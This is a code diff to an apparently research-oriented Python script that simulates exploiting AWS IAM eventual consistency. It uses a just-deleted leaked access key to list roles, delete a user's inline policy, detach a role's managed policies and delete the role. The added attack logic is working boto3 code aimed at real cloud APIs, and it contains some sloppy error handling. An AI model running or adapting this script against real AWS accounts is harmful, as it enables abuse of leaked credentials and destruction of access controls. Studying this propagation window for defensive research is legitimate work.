@@ -72,8 +72,15 @@ def eventual_consistency_attack() -> None:
         after delete-access-key operation"""
         pass
 
+    def perform_chain_of_attack(attacker_iam_client) -> bool:
+        """once the accesskey has been deleted, perform these
+        set of actions"""
+
+        # add below defined attack-level here 
+        pass 
+    
     def create_session(profile_name:str=None):
-        """this session will server leaked credentials to multiple boto3 clients"""
+        """this session will serve leaked credentials to multiple boto3 clients"""
 
         nonlocal user_creds
         try:
@@ -110,10 +117,18 @@ def eventual_consistency_attack() -> None:
     retry_delay = 5  # seconds
     for attempt in range(max_retries):
         try:
-            iam_roles_list = attacker_iam_client.get_paginator("list_roles").paginate()
-            for each_role in iam_roles_list:
-                logger.info(f"RoleName: {each_role.get('RoleName')}")
-            break  # Success, exit retry loop
+            iam_roles_list = attacker_iam_client.list_roles()
+            # save role information in user_creds
+            # focusing only on 1 role
+            user_creds["user-roles"] = []
+            for each_role in iam_roles_list.get("Roles"):
+                if each_role.get("RoleName") == "test":
+                    user_creds["user-roles"].append([each_role.get("RoleName"), each_role.get("Arn")])
+                    logger.info(f"Saved info. about role name: {each_role.get('RoleName')}")
+                    break
+                else:
+                    logger.info(f"Found role name: {each_role.get("RoleName")}")
+            break
         except ClientError as e:
             if e.response['Error']['Code'] == 'InvalidClientTokenId' and attempt < max_retries - 1:
                 logger.warning(f"Credentials not yet propagated, retrying in {retry_delay}s... (attempt {attempt + 1}/{max_retries})")
@@ -123,22 +138,61 @@ def eventual_consistency_attack() -> None:
     
     # user - delete the access key, as it has been leaked
     delete_access_key(user_iam_client)
+    #perform_chain_of_attack(attacker_iam_client)
+    #return
     
     # attacker - exploit eventual consistency window to list and delete compromised user policies
     # before deletion propagates across AWS
     logger.info("Attacker attempting to exploit eventual consistency window...")
+    attack_level = [0]*5
     attacker_succeeded = False
     for attempt in range(max_retries):
         try:
             # attacker made some API calls to test eventual consistency
-            iam_lup_resp = attacker_iam_client.list_user_policies(UserName=user_creds.get("user_name"))
-            if iam_lup_resp.get("PolicyNames"):
-                policy_name = iam_lup_resp.get("PolicyNames")[0]
-                attacker_iam_client.delete_user_policy(UserName=user_creds.get("user_name"), PolicyName=policy_name)
-                attacker_succeeded = True
-                logger.info("Attacker has successfully deleted the policy before propagation completes")
-            else:
-                logger.info("Policy does not exist")
+            if not attack_level[0]:
+                iam_lup_resp = attacker_iam_client.list_user_policies(UserName=user_creds.get("user_name"))
+                if iam_lup_resp.get("PolicyNames"):
+                    policy_name = iam_lup_resp.get("PolicyNames")[0]
+                    attacker_iam_client.delete_user_policy(UserName=user_creds.get("user_name"), PolicyName=policy_name)
+                    attack_level[0] = 1
+                    logger.info("Attacker has successfully deleted the policy before propagation completes")
+                else:
+                    logger.info("Policy does not exist")
+            
+            if not attack_level[1]:
+                # list policies attached a role and delete it 
+                # currently using only 1 role
+                try:
+                    role_policies_resp = attacker_iam_client.list_attached_role_policies(RoleName=user_creds.get("user-roles")[0][0])
+                except Exception as err:
+                    logger.error(f"Unable to perform list_attached_role_policies: {err.__str__()}")
+                if role_policies_resp.get("AttachedPolicies"):
+                    for policies in role_policies_resp.get("AttachedPolicies"):
+                        policy_arn = policies.get("PolicyArn")
+                        logger.info(f"found policy name: {policy_arn}")
+                    try:
+                        attacker_iam_client.detach_role_policy(RoleName=user_creds.get("user-roles")[0][0], PolicyArn=policy_arn)
+                        attack_level[1] = 1
+                        logger.info(f"Managed policy {policy_arn} has been deleted successfully")
+                    except (
+                        Exception,
+                        attacker_iam_client.exceptions.NoSuchEntityException,
+                        attacker_iam_client.exceptions.LimitExceededException,
+                        attacker_iam_client.exceptions.UnmodifiableEntityException,
+                        attacker_iam_client.exceptions.ServiceFailureException) as err:
+                        logger.error(f"Unable to detach role managed policy: {err.__str__()}")
+                else:
+                    logger.error(f"No attached policies found to role: {user_creds.get("user-roles")[0][0]}")
+            
+            if not attack_level[2]:
+                # once the managed policies have been detached; delete role now
+                try:
+                    attacker_iam_client.delete_role(RoleName=user_creds.get("user-roles")[0][0])
+                    attack_level[2] = 1
+                    logger.info(f"Role: {user_creds.get("user-roles")[0][0]} has been deleted")
+                except Exception as err:
+                    logger.error(f"Unable to delete role : {err.__str__()}")
+                
         except ClientError as e:
             if e.response['Error']['Code'] == 'InvalidClientTokenId':
                 if attempt < max_retries - 1:
@@ -150,7 +204,7 @@ def eventual_consistency_attack() -> None:
                 logger.error(f"Unexpected error: {e}")
                 break
     
-    if not attacker_succeeded:
+    if not any(attack_level):
         logger.info("Eventual consistency window closed - attack failed")
     else:
         logger.info("Policy deleted within eventual consistency window attack passed")
